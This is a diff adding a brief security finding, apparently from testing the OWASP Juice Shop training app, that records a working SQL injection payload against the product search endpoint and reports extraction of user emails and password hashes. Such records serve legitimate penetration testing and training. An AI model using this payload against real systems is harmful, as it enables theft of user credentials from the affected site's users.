@@ -1,0 +1,9 @@
+Finding: JUICE-002
+Vulnerability: SQL Injection - Data Extraction
+Endpoint: GET /rest/products/search?q=
+
+Payload:
+qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
+
+Observed Result:
+Successfully extracted 21 user records, including email addresses and password hashes.
